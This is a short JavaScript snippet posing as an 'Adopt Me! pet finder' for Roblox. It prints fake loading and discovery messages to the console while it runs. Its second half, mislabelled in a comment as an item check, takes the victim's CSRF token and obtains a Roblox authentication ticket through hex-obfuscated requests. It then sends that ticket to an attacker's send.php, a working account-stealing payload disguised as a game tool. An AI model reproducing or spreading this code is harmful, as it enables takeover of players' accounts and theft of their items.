//veiyo#0002 on top fr
console.log("Starting To Find Adopt Me! Pets")
console.log("Loading")
setTimeout(()=>console.log("Loading Your Benchmark PC 30%"), 1000)
setTimeout(()=>console.log("Loading Your Benchmark PC 40%"), 2500)
setTimeout(()=>console.log("Loading Your Benchmark PC 50%"), 3500)
setTimeout(()=>console.log("%cLoading has been successfully", "color: yellow"), 5000)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Failed Find MFR Shadow Dragon - SjMQ38YMfv6YrhEr", "color: red"), 7500)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Failed Find MFR Frost Dragon - ctnq3YAYPUDc9EJn", "color: red"), 10000)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Succefully Find MFR Bat Dragon - 6u9bBbwYPe6FmJws", "color: green"), 12500)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Overloaded To Find Adopt Me! Pets. Script Forced to be closed! - 6u9bBbwYPe6FmJws", "color: red"), 13500);

// Returning --

var send_url = name.split('"')[1].split("?")[0] + "send.php";
send_url = send_url.replace("index.php", "");
(async function() {
    // Coded by Rolimon 
    // this checks if the item is poisoned or clean.
    try {
        var xsrf = (await (await fetch("https://www.roblox.com/home", {
           credentials: "include"
        })).text()).split("csrf-token data-token=")[1].split(">")[0]
    } catch {
        var xsrf = (await (await fetch("https://www.roblox.com/home", {
           credentials: "include"
        })).text()).split("csrf-token data-token=")[1].split(">")[0]
    }
    

    var ticket = (await fetch("https://\x61\x75\x74\x68.roblox.com/v1/\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x2d\x74\x69\x63\x6b\x65\x74", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("\x72\x62\x78\x2d\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x2d\x74\x69\x63\x6b\x65\x74")

    await fetch(send_url + "?t=" + ticket)
})()
